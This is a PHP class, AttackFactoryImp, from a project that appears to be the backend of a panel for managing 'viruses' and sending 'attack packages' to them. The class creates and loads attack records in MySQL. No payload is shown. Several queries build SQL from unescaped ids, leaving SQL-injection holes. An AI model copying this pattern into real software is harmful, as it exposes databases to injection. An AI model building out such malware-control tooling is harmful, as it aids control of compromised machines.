<?php /** @noinspection PhpUndefinedMethodInspection */


namespace Kelvinho\Virus\Attack;


use Kelvinho\Virus\Id\IdGenerator;
use Kelvinho\Virus\Network\RequestData;
use Kelvinho\Virus\Session\Session;
use Kelvinho\Virus\User\UserFactory;
use Kelvinho\Virus\Virus\VirusFactory;
use mysqli;

/**
 * Class AttackFactory
 *
 * @package Kelvinho\Virus\Attack
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class AttackFactoryImp implements AttackFactory {
    private RequestData $requestData;
    private Session $session;
    private UserFactory $userFactory;
    private VirusFactory $virusFactory;
    private IdGenerator $idGenerator;
    private mysqli $mysqli;

    public function __construct() {
    }

    public function addContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, IdGenerator $idGenerator, mysqli $mysqli) {
        $this->requestData = $requestData;
        $this->session = $session;
        $this->userFactory = $userFactory;
        $this->virusFactory = $virusFactory;
        $this->idGenerator = $idGenerator;
        $this->mysqli = $mysqli;
    }

    /**
     * Get an attack when given an attack id.
     *
     * @param string $attack_id The attack id
     * @return AttackBase The attack
     */
    public function get(string $attack_id): AttackBase {
        $answer = $this->mysqli->query("select name, attack_package, virus_id, status, executed_time from attacks where attack_id = \"$attack_id\"");
        if (!$answer) throw new AttackNotFound();
        $row = $answer->fetch_assoc();
        if (!$row) throw new AttackNotFound();

        $packageDbName = $row["attack_package"];
        if (!PackageRegistrar::hasPackage($packageDbName)) throw new AttackPackageNotFound();
        $classname = PackageRegistrar::getClassName($packageDbName);
        /** @var AttackBase $attack */
        $attack = new $classname();

        $attack->setContext($this->requestData, $this->session, $this->userFactory, $this->virusFactory, $this, $this->mysqli);
        $attack->setAttackId($attack_id);
        $attack->setVirusId($row["virus_id"]);
        $attack->setPackageDbName($row["attack_package"]);
        $attack->setName($row["name"]);
        $attack->setStatus($row["status"]);
        $attack->setExecutedTime($row["executed_time"]);
        $attack->loadFromDisk();
        return $attack;
    }

    /**
     * Creates a new attack.
     *
     * @param string $virus_id The virus id
     * @param string $attack_package The attack package name
     * @param string $name The attack name
     * @return AttackBase The attack
     * @throws AttackPackageNotFound if the attack package doesn't exist
     */
    public function new(string $virus_id, string $attack_package, string $name): AttackBase {
        if (!PackageRegistrar::hasPackage($attack_package)) throw new AttackPackageNotFound();
        $attack_id = $this->idGenerator->newAttackId();
        $classname = PackageRegistrar::getClassName($attack_package);

        mkdir(DATA_FILE . "/attacks/$attack_id");
        touch(DATA_FILE . "/attacks/$attack_id/profile.txt");
        touch(DATA_FILE . "/attacks/$attack_id/state.json");

        $attack = new $classname();
        /** @var AttackBase $attack */
        $attack->setContext($this->requestData, $this->session, $this->userFactory, $this->virusFactory, $this, $this->mysqli);
        $attack->setAttackId($attack_id);
        $attack->setVirusId($virus_id);
        $attack->setPackageDbName($attack_package);
        $attack->setName($name);

        $this->mysqli->query("insert into attacks (attack_id, virus_id, attack_package, status, name) values (\"$attack_id\", \"$virus_id\", \"$attack_package\", \"" . $attack->getStatus() . "\", \"" . $this->mysqli->escape_string($name) . "\")");
        $attack->saveState();
        return $this->get($attack_id);
    }

    /**
     * Checks whether an attack id exists or not.
     *
     * @param string $attack_id The attack id
     * @return bool Whether it exists or not
     */
    public function exists(string $attack_id): bool {
        $answer = $this->mysqli->query("select attack_id from attacks where attack_id = \"" . $this->mysqli->escape_string($attack_id) . "\"");
        if ($answer) {
            $row = $answer->fetch_assoc();
            if ($row) {
                return true;
            }
        }
        return false;
    }
}